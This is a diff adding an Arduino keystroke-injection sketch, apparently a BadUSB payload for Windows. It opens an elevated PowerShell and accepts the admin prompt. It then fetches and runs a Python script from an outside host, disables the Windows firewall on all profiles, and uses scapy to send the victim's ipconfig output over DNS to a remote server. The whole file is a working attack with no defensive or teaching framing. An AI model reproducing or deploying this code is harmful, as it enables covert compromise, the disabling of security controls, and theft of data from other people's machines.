@@ -1,0 +1,106 @@
+
+#include "Keyboard.h"
+
+void setup() {
+
+  String url = "http://girardeau-cv.cf/crafting.py";
+  String file = "crafting.py";
+  String dir = "C:/Program Files/Invoke-WebRequest-Demo/";
+  String path = dir+file;
+  String ipconfig = "ipconfig.txt";
+  
+  
+  
+  // put your setup code here, to run once:
+  Keyboard.begin();
+  delay(1500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(1000);
+
+  Keyboard.print("powershell Start-Process powershell -Verb runAs");
+  typeKey(KEY_RETURN);
+  delay(1500);
+
+  typeKey(KEY_LEFT_ARROW);
+  typeKey(KEY_RETURN);
+  delay(1000);
+
+  Keyboard.print("mkdir '"+dir+"'");
+  typeKey(KEY_RETURN);
+  delay(500);
+  Keyboard.print("Invoke-WebRequest -Uri '"+url+"' -OutFile '"+path+"' -PassThru");
+  typeKey(KEY_RETURN);
+  delay(1000);
+
+  Keyboard.print("py '"+path+"'");
+  typeKey(KEY_RETURN);
+  delay(2000);
+
+  Keyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
+  typeKey(KEY_RETURN);
+
+
+  Keyboard.print("$testeu = ipconfig");
+  typeKey(KEY_RETURN);
+  Keyboard.print("$testeu ");
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.write();
+  Keyboard.releaseAll();
+  delay(5000);
+  Keyboard.print(" Out-File '"+dir+ipconfig+"'");
+  typeKey(KEY_RETURN);
+  delay(1500);
+
+  Keyboard.print("scapy");
+  typeKey(KEY_RETURN);
+  delay(500);
+
+  Keyboard.print("ipconfig = open('"+dir+ipconfig+"', 'r').read()");
+  typeKey(KEY_RETURN);
+  delay(500);
+
+  Keyboard.print("print(ipconfig)");
+  typeKey(KEY_RETURN);
+  delay(500);
+
+  Keyboard.print("for i in ipconfig:");
+  typeKey(KEY_RETURN);
+  typeKey(KEY_TAB);
+//  Keyboard.print("send (IP(dst='vps778212.ovh.net') / UDP() / DNS(qd=DNSQR(qname='73a94e9217810f490cff289694d0e538', qtype='A'))/str(i))");
+//  typeKey(KEY_RETURN);
+  Keyboard.print("print(i)");
+  typeKey(KEY_RETURN);
+  typeKey(KEY_TAB);
+
+
+
+
+  Keyboard.print("send (IP(dst='vps778212.ovh.net') / UDP() / DNS(qd=DNSQR(qname='73a94e9217810f490cff289694d0e538', qtype='A'))/");
+  Keyboard.print("ipconfig)");
+  typeKey(KEY_RETURN);
+  typeKey(KEY_RETURN);
+  
+  
+  delay(500);
+  
+//  Keyboard.print("send (IP(dst='vps778212.ovh.net') / UDP() / DNS(qd=DNSQR(qname='73a94e9217810f490cff289694d0e538', qtype='A'))/str(i))");
+//  typeKey(KEY_RETURN);
+//  typeKey(KEY_RETURN);
+
+  Keyboard.end();
+}
+
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
